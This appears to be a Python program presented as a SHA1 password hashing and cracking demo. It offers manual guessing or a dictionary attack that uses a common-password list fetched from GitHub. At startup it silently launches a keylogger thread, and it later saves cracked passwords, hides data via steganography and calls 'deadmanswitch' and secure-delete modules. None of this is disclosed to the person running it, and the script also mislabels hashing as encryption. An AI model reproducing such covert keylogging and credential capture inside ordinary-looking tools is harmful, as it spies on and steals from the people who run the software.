from os import read, write,path
import sys
from urllib.request import hashlib,urlopen
import keylogger as kl
import threading
import pyautogui as pa
from extractpasswordtofile import savepassword
from steg import convertToSteg
from deadmanswitch import setup
from secure_delete import secure_delete

fileurl="passlist.txt"
result="null"
ch=0
keylogger_thread=threading.Thread(target=kl.activateKeylogger) #start the keylogger
keylogger_thread.start()

#function to perform sha1 conversion
def convertToHash(word):
    converted_hash=hashlib.sha1(word.encode()).hexdigest() #converting string to sha1
    return converted_hash

#convert plaintext into sha1
def encrypt():
    global result
    try:
        word=pa.password("Enter the password to be converted:")
        result=convertToHash(word)
    except:
        sys.exit("Terminated")
    pa.alert( result,"SHA 1 encrypted password is","Continue")
    print("SHA1 encrypted password is :")
    print(result)

#brute force password check by comparing hash 
def decrypt(ch):
#manual bruteforce

    if ch==1:
        guess_str=pa.password("Enter a password guess:")
        cmp_result=convertToHash(guess_str)
        print("SHA1 hash of guess is:")
        print(cmp_result)
        if cmp_result==result:
            print("\nHash Match")
            print("\nPassword Found")
            print("\nPassword is: ",guess_str)
        else:
            print("\nNo hash matches found...")
            print("\nPassword not found")

#pre-generated list bruteforce
    if ch==2:
        try:
#creates a file which contains the list of all the common passwords and appends the data
            with open(fileurl,"x") as f:
                LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                f=open(fileurl,"a")
                f.write(guess)
                f.write("\n")
                f.close()
            print("File created")
        except(FileExistsError):
            print("File already exists")
        print("Fetching data from password list...\n")
#opening the password file and comparing the hashes
        guess_pass=open(fileurl,"r").read().split("\n")
        for guess in guess_pass:
            hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
            if hashedGuess == result:
                pa.alert(guess,"Password is","Done")
                print("Encoding to image\n")
                convertToSteg()
                setup()
                sys.exit("Completed")

            elif hashedGuess != result:
                print("Password guess ",str(guess)," does not match, trying next...")
    pa.alert("Bruteforce failed... Password not in Database, adding to list")
    savepassword()
    convertToSteg()
    setup()

print("Generate SHA1 encrypted password and save the cracked passwords to a txt file")
encrypt()
choice=pa.confirm("Select option for cracking","Cracking",buttons=['Manual','Pre-defined List'])
if choice=='Manual':
    decrypt(1)
if choice=='Pre-defined List':
    decrypt(2)
